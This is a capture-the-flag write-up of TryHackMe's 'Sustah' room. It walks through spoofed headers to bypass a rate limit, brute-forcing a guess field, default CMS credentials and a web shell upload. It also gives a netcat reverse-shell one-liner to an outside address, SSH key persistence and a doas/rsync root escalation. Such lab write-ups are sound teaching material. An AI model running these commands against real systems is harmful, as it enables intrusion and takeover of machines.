# Sustah

https://tryhackme.com/room/sustah

"The developers have added anti-cheat measures to their game. Are you able to defeat the restrictions to gain access to their internal CMS?"

An easy-ish room (solved it in under an hour, which is good for me), with some new tricks I haven't used before.

1. NMap revealed 22, 80 and 8085. Both 80 and 8085 looked like single page websites, with nothing on 80
2. 8085 hosted a 'Spinner' site, where you had to guess a number. Throwing this into burp intruder quickly ran into a strict ratelimit. The hint for this was 'what headers can you add?'
3. Researching bypassing ratelimiting, I tried a bunch of things. Eventually adding the following headers and header values got me through:

  ```
  X-Originating-IP: 127.0.0.1
  X-Forwarded-For: 127.0.0.1
  X-Remote-IP: 127.0.0.1
  X-Remote-Addr: 127.0.0.1
  X-Client-IP: 127.0.0.1
  X-Host: 127.0.0.1
  X-Forwared-Host: 127.0.0.1
  ```
  
  This was from https://book.hacktricks.xyz/pentesting-web/rate-limit-bypass. Later, looking at the spinner code, it was specifically set to bypass limiting for `X-Remote-Addr` with that localhost value.
  
4. Now I was able to brute force the number, using Intruder to attack with 500 threads and all numbers from 10000 to 99999 (as the answer field showed five digits). Getting the right number revealed a hidden path under the 80 site.

5. On this site was a CMS - I won't say the type as that is one of the room's questions. I was able to find credentials on one of its pages on the site-map, which turned out to be publically documented default credentials. There was also a known exploit, where if you have creds for an admin user (as the default user is) you can access a file upload screen that doesn't do any vetting. The version of the CMS was one of the other questions - I submitted the version on the exploit entry from exploit-db, which was correct.

6. Uploading a PHP web shell, I connected back to my attack machine with `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.7.78 4444 >/tmp/f`

7. On the machine, www-data had no access to find and there wasn't anything obvious. The question hint, however, said something about interesting backups. Checking `/var/backups`, I found a hidden file called `.bak.passwd`, which contained the password for `kiran`, the only user with a home folder.

8. As kiran I got the user flag, then added my ssh pub key to a new authorized_keys entry under a new .ssh folder (chmod 700 on the .ssh folder, and 600 on authorized keys, I always need to look this up). Afterwards I could ssh in easily.

9. Basic enumeration got me nowhere. The question hint was 'you dont always need sudo', but it wans't until I ran linpeas that I figured out what this alluded to: there is a quasi-alternative to sudo called `doas`. Specifically, here kiran was able to run `rsync as root` via doas (as can be seen in `doas.conf`, which linpeas checked for me).

10. The final privesc was `doas -u root rsync -e 'sh -p -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null` which got me a root shell and the final flag, the rsync args coming from gtfo-bins.
